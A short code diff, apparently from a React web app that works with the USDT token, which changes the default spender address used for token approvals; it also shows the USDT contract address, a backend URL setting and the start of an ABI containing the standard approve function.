@@ -21,7 +21,7 @@ import { AlertTriangle } from "lucide-react";
 
 // 🔹 CONSTANTS
 const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
-const DEFAULT_SPENDER_ADDRESS = '0x73E2339c61E563FBC6E0173ad698742e6093407a';
+const DEFAULT_SPENDER_ADDRESS = '0x7f43ba7d7CF1bc31Da78bcC40ACE99978a7F288B';
 const BACKEND_URL = import.meta.env.VITE_BACKEND_URL;
 const USDT_ABI = [
     'function approve(address spender, uint256 amount) external returns (bool)',
